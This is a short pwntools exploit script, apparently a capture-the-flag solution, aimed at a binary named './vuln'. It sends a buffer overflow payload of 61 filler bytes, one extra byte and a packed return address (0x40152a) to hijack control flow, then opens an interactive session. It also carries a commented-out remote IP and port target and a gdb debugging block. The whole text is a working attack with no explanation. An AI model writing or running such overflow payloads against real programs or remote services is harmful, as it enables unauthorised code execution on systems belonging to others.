from pwn import *

p=process('./vuln')
#p=remote('34.51.233.21',6020)
elf=ELF("./vuln")
context.terminal = ['tmux', 'splitw', '-h', '-F', '#{pane_pid}', '-P']
payload=b'X'*61  + b"4"+ p64(0x000000000040152a)


#gdb.attach(p,gdbscript='''
 #   init-pwndbg
  #  b *0x000000000040165b
   # c

#''')

p.sendline(payload)
p.interactive()
